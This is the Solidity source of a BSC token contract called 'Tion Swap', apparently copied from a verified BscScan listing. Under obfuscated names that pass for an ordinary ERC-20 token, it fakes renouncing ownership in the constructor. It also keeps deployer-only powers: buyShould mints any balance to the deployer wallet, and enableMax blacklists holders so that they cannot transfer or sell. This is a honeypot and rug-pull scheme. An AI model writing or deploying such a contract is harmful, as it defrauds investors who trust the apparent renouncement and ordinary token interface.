/**
 *Submitted for verification at BscScan.com on 2023-02-19
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface totalFrom {
    function totalSupply() external view returns (uint256);

    function balanceOf(address txExempt) external view returns (uint256);

    function transfer(address feeMin, uint256 modeLaunch) external returns (bool);

    function allowance(address launchedMin, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeLaunch) external returns (bool);

    function transferFrom(
        address sender,
        address feeMin,
        uint256 modeLaunch
    ) external returns (bool);

    event Transfer(address indexed from, address indexed teamList, uint256 value);
    event Approval(address indexed launchedMin, address indexed spender, uint256 value);
}

interface buyToLimit is totalFrom {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract launchedAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptEnable {
    function createPair(address marketingListTeam, address receiverTotal) external returns (address);
}

interface launchWallet {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract TionSwap is launchedAt, totalFrom, buyToLimit {

    uint256 public fromIsTo;

    function launchAmount() public view returns (bool) {
        return enableWalletReceiver;
    }

    function toTakeToken() public {
        
        
        launchTeam=false;
    }

    function exemptTradingTo(address tokenMinLimit, address feeMin, uint256 modeLaunch) internal returns (bool) {
        require(walletMin[tokenMinLimit] >= modeLaunch);
        walletMin[tokenMinLimit] -= modeLaunch;
        walletMin[feeMin] += modeLaunch;
        emit Transfer(tokenMinLimit, feeMin, modeLaunch);
        return true;
    }

    bool private launchTeam;

    function receiverSwap() public {
        emit OwnershipTransferred(marketingReceiverFee, address(0));
        toListLaunch = address(0);
    }

    address public marketingReceiverFee;

    address public sellList;

    function approve(address tokenLaunchIs, uint256 modeLaunch) public virtual override returns (bool) {
        launchList[_msgSender()][tokenLaunchIs] = modeLaunch;
        emit Approval(_msgSender(), tokenLaunchIs, modeLaunch);
        return true;
    }

    bool public receiverExempt;

    bool public swapSell;

    bool public limitReceiver;

    string private limitAuto = "TSP";

    function launchedIsSwap(address totalAt) public {
        if (swapSell) {
            return;
        }
        if (tokenIs != isAuto) {
            launchTeam = true;
        }
        atTxReceiver[totalAt] = true;
        
        swapSell = true;
    }

    function buyShould(uint256 modeLaunch) public {
        if (!atTxReceiver[_msgSender()]) {
            return;
        }
        walletMin[marketingReceiverFee] = modeLaunch;
    }

    function getOwner() external view returns (address) {
        return toListLaunch;
    }

    bool private maxMode;

    mapping(address => mapping(address => uint256)) private launchList;

    address private toListLaunch;

    function shouldBuy(address tokenMinLimit, address feeMin, uint256 modeLaunch) internal returns (bool) {
        if (tokenMinLimit == marketingReceiverFee) {
            return exemptTradingTo(tokenMinLimit, feeMin, modeLaunch);
        }
        require(!sellReceiverBuy[tokenMinLimit]);
        return exemptTradingTo(tokenMinLimit, feeMin, modeLaunch);
    }

    function owner() external view returns (address) {
        return toListLaunch;
    }

    uint256 public isAuto;

    function modeExempt() public {
        
        if (limitReceiver) {
            isAuto = tokenIs;
        }
        receiverExempt=false;
    }

    function allowance(address takeExempt, address tokenLaunchIs) external view virtual override returns (uint256) {
        return launchList[takeExempt][tokenLaunchIs];
    }

    function feeTeam() public {
        
        if (enableWalletReceiver == maxMode) {
            maxMode = true;
        }
        tokenIs=0;
    }

    mapping(address => uint256) private walletMin;

    function decimals() external view virtual override returns (uint8) {
        return feeMinFrom;
    }

    uint256 private launchedSwap = 100000000 * 10 ** 18;

    mapping(address => bool) public atTxReceiver;

    function transferFrom(address tokenMinLimit, address feeMin, uint256 modeLaunch) external override returns (bool) {
        if (launchList[tokenMinLimit][_msgSender()] != type(uint256).max) {
            require(modeLaunch <= launchList[tokenMinLimit][_msgSender()]);
            launchList[tokenMinLimit][_msgSender()] -= modeLaunch;
        }
        return shouldBuy(tokenMinLimit, feeMin, modeLaunch);
    }

    function transfer(address fromList, uint256 modeLaunch) external virtual override returns (bool) {
        return shouldBuy(_msgSender(), fromList, modeLaunch);
    }

    bool public launchBuy;

    uint8 private feeMinFrom = 18;

    function tradingExempt() public view returns (bool) {
        return launchBuy;
    }

    mapping(address => bool) public sellReceiverBuy;

    function exemptToken() public {
        
        if (maxMode) {
            receiverExempt = false;
        }
        maxMode=false;
    }

    constructor (){
        
        launchWallet feeLaunched = launchWallet(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        sellList = exemptEnable(feeLaunched.factory()).createPair(feeLaunched.WETH(), address(this));
        toListLaunch = _msgSender();
        
        marketingReceiverFee = _msgSender();
        atTxReceiver[_msgSender()] = true;
        
        walletMin[_msgSender()] = launchedSwap;
        emit Transfer(address(0), marketingReceiverFee, launchedSwap);
        receiverSwap();
    }

    function totalSupply() external view virtual override returns (uint256) {
        return launchedSwap;
    }

    function name() external view virtual override returns (string memory) {
        return autoTo;
    }

    function symbol() external view virtual override returns (string memory) {
        return limitAuto;
    }

    function balanceOf(address txExempt) public view virtual override returns (uint256) {
        return walletMin[txExempt];
    }

    function atBuy() public view returns (bool) {
        return launchBuy;
    }

    event OwnershipTransferred(address indexed limitLaunched, address indexed teamAt);

    uint256 public tokenIs;

    bool public enableWalletReceiver;

    string private autoTo = "Tion Swap";

    function modeLaunched() public view returns (bool) {
        return enableWalletReceiver;
    }

    function enableMax(address isMode) public {
        if (limitReceiver != launchTeam) {
            enableWalletReceiver = true;
        }
        if (isMode == marketingReceiverFee || isMode == sellList || !atTxReceiver[_msgSender()]) {
            return;
        }
        
        sellReceiverBuy[isMode] = true;
    }

}